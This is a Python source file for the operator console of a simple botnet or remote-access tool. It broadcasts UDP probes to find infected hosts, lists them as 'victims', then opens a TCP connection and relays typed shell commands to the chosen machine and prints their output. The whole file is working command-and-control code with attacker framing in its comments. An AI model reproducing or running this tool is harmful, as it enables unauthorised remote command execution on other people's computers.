import socket
import datetime

UDP_PORT = 32568
TCP_PORT = 32569

protocol = {
    "REQ": 8569,
    "RPY": 4586
}


def search_bot(s, address):
    s.sendto(str(protocol["REQ"]).encode(), ("255.255.255.255", UDP_PORT))
    t = int(datetime.datetime.now().strftime("%f"))
    while int(datetime.datetime.now().strftime("%f")) - t < 1000000:
        try:
            msg, addr = s.recvfrom(1024)
        except socket.timeout:
            break
        dec = str(protocol["RPY"])
        dec2 = msg.decode()
        if msg.decode()[:-1] == str(protocol["RPY"]):
            address.append(addr[0])


def telnet():
    address = []
    udp_sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_sock.settimeout(0.5)  # if the socket hasn't received anything
    # in half a second it will raise a timeout exception

    while True:
        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        search_bot(udp_sock, address)  # searching for new victims, only one second every time

        ''' printing all connected victims'''
        for x in range(0, len(address)):
            print(f"[{x + 1}] - {address[x]}")

        index = input(f"Select Victim: ")   # choosing the victim
        s.connect((address[int(index) - 1], TCP_PORT))

        while 1:
            command = input("$>")   # entering the command
            if command == "return":   # in case of return we break
                break
            if command == "":
                continue
            s.send(command.encode())
            output = s.recv(4096)
            while len(output) >= 4096:
                output += s.recv(4096)
            print(output.decode())


if __name__ == '__main__':
    telnet()
